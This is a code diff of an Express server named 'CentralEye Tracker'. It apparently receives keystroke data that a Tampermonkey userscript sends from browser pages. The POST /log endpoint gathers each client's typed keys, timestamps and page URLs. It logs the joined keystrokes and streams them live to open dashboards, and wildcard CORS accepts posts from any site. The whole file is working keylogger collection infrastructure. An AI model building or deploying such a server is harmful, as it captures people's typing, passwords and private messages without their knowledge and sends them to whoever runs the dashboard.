@@ -1,23 +1,31 @@
+const express = require('express');
 const cors = require('cors');
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// THIS FIXES THE CORS + CREDENTIALS ERROR
 app.use(cors({
-  origin: '*',  // Wildcard OK now
+  origin: '*',                    // Allows all websites
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type'],
-  credentials: false  // ← KEY FIX: Explicitly disable credentials
+  credentials: false              // ← THIS LINE IS CRITICAL
 }));
 
-// Add this for preflight OPTIONS
+// Handle preflight requests (OPTIONS) for all routes
 app.options('*', cors());
-// In-memory broadcast
+
+// Parse JSON bodies
+app.use(express.json({ limit: '10mb' }));
+
+// In-memory live broadcast to all open dashboards
 const clients = new Set();
 
-// SSE Stream
+// SSE endpoint for the dashboard
 app.get('/stream', (req, res) => {
   res.setHeader('Content-Type', 'text/event-stream');
   res.setHeader('Cache-Control', 'no-cache');
   res.setHeader('Connection', 'keep-alive');
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.flushHeaders();
 
   const send = (data) => {
@@ -25,6 +33,7 @@ app.get('/stream', (req, res) => {
   };
   clients.add(send);
 
+  // Keep Render free tier awake
   const keepAlive = setInterval(() => res.write('data: ping\n\n'), 15000);
 
   req.on('close', () => {
@@ -33,27 +42,32 @@ app.get('/stream', (req, res) => {
   });
 });
 
-// POST /log
+// MAIN LOG ENDPOINT — Tampermonkey hits this
 app.post('/log', (req, res) => {
   const payload = {
     url: req.body.url || "unknown",
     client: req.body.client || "unknown",
-    field: req.body.field || "",
     keys: Array.isArray(req.body.keys) ? req.body.keys : [],
     timestamps: Array.isArray(req.body.ts) ? req.body.ts : []
   };
 
   console.log(`[LIVE] ${payload.client} → ${payload.url} → ${payload.keys.join('')}`);
 
-  clients.forEach(send => send(payload));
+  // Broadcast to all open dashboards instantly
+  for (const send of clients) send(payload);
 
   res.json({ status: "ok" });
 });
 
-// Health check
-app.get('/', (req, res) => res.send('Tracker Server Live'));
-app.get('/log', (req, res) => res.json({ message: "Use POST /log to send data." }));
+// Simple homepage
+app.get('/', (req, res) => {
+  res.send(`
+    <h1>CentralEye Tracker Server — LIVE</h1>
+    <p>Open your dashboard: <a href="https://fs-tracker-online.onrender.com">https://fs-tracker-online.onrender.com</a></p>
+  `);
+});
 
 app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(`Server running → https://fs-tracker-online.onrender.com`);
+  console.log(`Dashboard → https://fs-tracker-online.onrender.com`);
 });
